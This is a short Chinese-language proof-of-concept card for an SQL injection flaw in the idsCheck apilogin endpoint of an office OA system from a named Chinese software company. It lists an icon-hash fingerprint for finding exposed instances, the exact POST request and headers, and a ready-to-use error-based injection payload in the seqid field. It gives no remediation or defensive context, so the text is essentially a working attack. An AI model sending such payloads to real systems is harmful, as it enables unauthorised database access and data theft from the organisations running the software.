# 思普信息技术有限公司办公OA系统idsCheckapilogin存在SQL注入漏洞

- **系统**：思普信息技术有限公司办公OA系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-403479360"`
- **请求**：`POST /IdsCenter/idsCheck?p=apilogin HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
seqid=1'+AND+6884+IN+(SELECT+(CHAR(113)+CHAR(106)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT+(CASE+WHEN+(6884=6884)+THEN+CHAR(49)+ELSE+CHAR(48)+END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(113)))--+cxaC&datasource=EOMP1
```
- **预期**：200　|　—